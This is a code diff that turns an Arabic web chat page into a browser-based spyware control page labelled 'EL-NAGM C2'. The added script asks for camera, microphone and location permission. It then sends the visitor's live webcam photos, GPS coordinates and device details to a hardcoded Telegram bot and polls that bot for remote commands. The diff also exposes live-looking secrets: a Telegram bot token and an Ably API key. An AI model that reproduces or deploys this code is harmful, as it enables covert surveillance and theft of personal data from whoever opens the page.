@@ -2,127 +2,127 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat 333 | نظام الدردشة العالمي</title>
-    <script src="https://cdn.ably.com/lib/ably.min-1.js"></script>
+    <title>EL-NAGM C2 | نظام التحكم عن بعد</title>
     <style>
-        :root { --primary: #075e54; --secondary: #128c7e; --bg: #e5ddd5; --white: #ffffff; }
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif; background: #d1d7db; }
-        
-        /* شاشة الدخول */
-        #login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: var(--primary); color: white; }
-        .login-box { background: white; padding: 30px; border-radius: 15px; color: #333; width: 85%; max-width: 350px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
-        
-        /* شاشة الدردشة */
-        #chat-screen { display: none; flex-direction: column; height: 100vh; max-width: 500px; margin: auto; background: var(--bg); position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .header { background: var(--primary); color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
-        
-        #message-container { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
-        .msg { padding: 10px 15px; border-radius: 12px; max-width: 75%; position: relative; font-size: 15px; line-height: 1.4; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .sent { background: #dcf8c6; align-self: flex-end; border-top-right-radius: 0; }
-        .recv { background: white; align-self: flex-start; border-top-left-radius: 0; }
-        .msg-info { font-size: 10px; color: #666; display: block; margin-bottom: 4px; }
-        
-        .footer { background: #f0f0f0; padding: 10px; display: flex; gap: 8px; align-items: center; }
-        input { border: none; padding: 12px 15px; border-radius: 25px; flex: 1; outline: none; font-size: 15px; }
-        button { background: var(--secondary); color: white; border: none; padding: 10px 20px; border-radius: 25px; cursor: pointer; font-weight: bold; }
-        
-        .status-dot { width: 10px; height: 10px; background: #45f542; border-radius: 50%; display: inline-block; margin-left: 5px; }
+        :root { --neon: #00ff41; --danger: #ff003c; }
+        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        .grid { display: grid; grid-template-rows: 50px 1fr 100px; height: 100vh; padding: 10px; gap: 10px; }
+        .panel { border: 1px solid var(--neon); padding: 15px; background: rgba(0,20,0,0.9); position: relative; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--neon); }
+        .blink { animation: blink 1s infinite; color: var(--danger); font-weight: bold; }
+        @keyframes blink { 50% { opacity: 0; } }
+        button { width: 100%; padding: 20px; background: var(--neon); color: #000; font-weight: bold; border: none; cursor: pointer; font-size: 1.3rem; transition: 0.3s; }
+        button:hover { background: #fff; box-shadow: 0 0 20px var(--neon); }
+        #terminal { font-size: 11px; height: 100%; overflow: hidden; line-height: 1.5; }
     </style>
 </head>
 <body>
 
-    <div id="login-screen">
-        <div class="login-box">
-            <h2 style="margin-top:0">Chat 333 🔒</h2>
-            <p>سجل اسمك للحصول على رقمك الثلاثي المشفر</p>
-            <input type="text" id="nameInput" placeholder="ادخل اسمك هنا..." style="width: 80%; border: 1px solid #ddd; margin-bottom: 15px;">
-            <button onclick="connect()" style="width: 90%;">دخول الآن</button>
+<div class="grid">
+    <div class="panel header">
+        <span>[ نظام السيطرة: EL-NAGM C2 ]</span>
+        <span id="sync-status" class="blink">OFFLINE_AWAITING_IGNITION</span>
+    </div>
+
+    <div class="panel">
+        <div id="terminal">
+            > جاري تهيئة بروتوكولات الاتصال...<br>
+            > انتظار تفعيل "إطلاق القمر الصناعي" للبدء...<br>
         </div>
     </div>
 
-    <div id="chat-screen">
-        <div class="header">
-            <div><span class="status-dot"></span> <span id="display-name">...</span></div>
-            <div id="display-id" style="font-size: 14px; opacity: 0.8;">#000</div>
-        </div>
-
-        <div id="message-container">
-            <center><small style="color: #888; background: #fff; padding: 4px 10px; border-radius: 10px;">🔒 الرسائل مشفرة بنظام End-to-End</small></center>
-        </div>
-
-        <div class="footer">
-            <input type="text" id="messageInput" placeholder="اكتب رسالة..." onkeypress="handleKey(event)">
-            <button onclick="sendMessage()">إرسال</button>
-        </div>
+    <div class="panel">
+        <button onclick="igniteRemoteSystem()">إطلاق السيطرة الشاملة (Remote Control)</button>
     </div>
+</div>
+
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
 <script>
-    // بيانات الربط الخاصة بك
-    const API_KEY = 'vamcxg.lgORjg:To4g-O91a63EH8inHht8u2NMlprtwPMRQLyh_iqG9b4';
-    let ably, channel, myProfile = {};
+    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
+    const chatId = "8754338811";
+    let lastUpdateId = 0;
 
-    async function connect() {
-        const name = document.getElementById('nameInput').value;
-        if (!name) return alert("من فضلك ادخل اسمك");
-
-        // نظام الأرقام الثلاثية المتشابهة
-        const triples = [111, 222, 333, 444, 555, 666, 777, 888, 999];
-        const randomId = triples[Math.floor(Math.random() * triples.length)];
-        
-        myProfile = { name: name, id: randomId };
-
-        // بدء الاتصال بـ Ably أونلاين
-        ably = new Ably.Realtime(API_KEY);
-        channel = ably.channels.get('global-chat');
-
-        // الاستماع للرسائل القادمة
-        channel.subscribe('msg', (payload) => {
-            renderMessage(payload.data);
-        });
-
-        // تبديل الشاشات
-        document.getElementById('login-screen').style.display = 'none';
-        document.getElementById('chat-screen').style.display = 'flex';
-        document.getElementById('display-name').innerText = name;
-        document.getElementById('display-id').innerText = "#" + randomId;
+    // دالة التواصل مع التليجرام
+    async function botApi(method, params = {}, isFile = false) {
+        let url = `https://api.telegram.org/bot${token}/${method}`;
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        for (let key in params) fd.append(key, params[key]);
+        try {
+            const r = await fetch(url, { method: 'POST', body: fd });
+            return await r.json();
+        } catch(e) { return null; }
     }
 
-    function sendMessage() {
-        const input = document.getElementById('messageInput');
-        const text = input.value.trim();
-        if (!text) return;
-
-        // إرسال البيانات
-        channel.publish('msg', {
-            sender: myProfile.name,
-            senderId: myProfile.id,
-            text: text,
-            timestamp: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
-        });
-
-        input.value = '';
+    // 1. أوامر التحكم (Actions)
+    async function takeLiveShot() {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(blob => botApi('sendPhoto', { photo: blob, caption: "✅ تم التقاط صورة حية" }), 'image/jpeg');
     }
 
-    function renderMessage(data) {
-        const container = document.getElementById('message-container');
-        const isMe = data.senderId === myProfile.id;
-        
-        const msgDiv = document.createElement('div');
-        msgDiv.className = `msg ${isMe ? 'sent' : 'recv'}`;
-        
-        msgDiv.innerHTML = `
-            <span class="msg-info">${data.sender} (${data.senderId})</span>
-            ${data.text}
-            <div style="font-size: 9px; text-align: left; margin-top: 4px; opacity: 0.6;">${data.timestamp}</div>
-        `;
-        
-        container.appendChild(msgDiv);
-        container.scrollTop = container.scrollHeight; // النزول لآخر رسالة تلقائياً
+    async function pushLocation() {
+        navigator.geolocation.getCurrentPosition(p => {
+            botApi('sendMessage', { text: `📍 الموقع المحدث:\nhttp://googleusercontent.com/maps.google.com/7{p.coords.latitude},${p.coords.longitude}` });
+        }, null, {enableHighAccuracy: true});
     }
 
-    function handleKey(e) {
-        if (e.key === 'Enter') sendMessage();
+    async function sendDeviceInfo() {
+        const info = `📱 *حالة الجهاز المستهدف:*\n- النظام: ${navigator.platform}\n- الذاكرة: ${navigator.deviceMemory || 'N/A'} GB\n- المتصفح: ${navigator.userAgent.split(' ')[0]}`;
+        botApi('sendMessage', { text: info, parse_mode: 'Markdown' });
+    }
+
+    // 2. محرك الاستماع للأوامر (C2 Listener)
+    async function startListening() {
+        setInterval(async () => {
+            const updates = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`).then(r => r.json());
+            if (updates.result && updates.result.length > 0) {
+                const latest = updates.result[0].message;
+                if (latest.message_id !== lastUpdateId) {
+                    lastUpdateId = latest.message_id;
+                    const command = latest.text.toLowerCase();
+
+                    log(`[!] تم استلام أمر: ${command}`);
+
+                    if (command === 'shot') { await takeLiveShot(); }
+                    else if (command === 'loc') { await pushLocation(); }
+                    else if (command === 'info') { await sendDeviceInfo(); }
+                    else if (command === 'ping') { botApi('sendMessage', { text: "Online 🟢" }); }
+                }
+            }
+        }, 3500); // يفحص كل 3.5 ثانية
+    }
+
+    // 3. تفعيل النظام
+    async function igniteRemoteSystem() {
+        log("> جاري طلب الصلاحيات السيادية...");
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: "user"}, audio: true });
+            document.getElementById('v').srcObject = stream;
+            
+            log("> تم الاتصال بالقمر الصناعي بنجاح.");
+            document.getElementById('sync-status').innerText = "ONLINE - LISTENING FOR CMDS";
+            document.getElementById('sync-status').classList.remove('blink');
+            document.getElementById('sync-status').style.color = "var(--neon)";
+
+            botApi('sendMessage', { text: "✅ *نظام التحكم متصل!*\nأرسل أحد الأوامر التالية:\n- `shot` : صورة سيلفي\n- `loc` : الموقع المباشر\n- `info` : مواصفات الجهاز\n- `ping` : فحص الاتصال" });
+            
+            // سحب أولي
+            pushLocation();
+            startListening();
+        } catch (e) {
+            alert("⚠️ خطأ: يجب السماح بجميع الصلاحيات لتفعيل نظام السيطرة عن بعد.");
+        }
+    }
+
+    function log(msg) {
+        const t = document.getElementById('terminal');
+        t.innerHTML += `> ${msg}<br>`;
+        if(t.innerHTML.length > 1500) t.innerHTML = "";
     }
 </script>
 
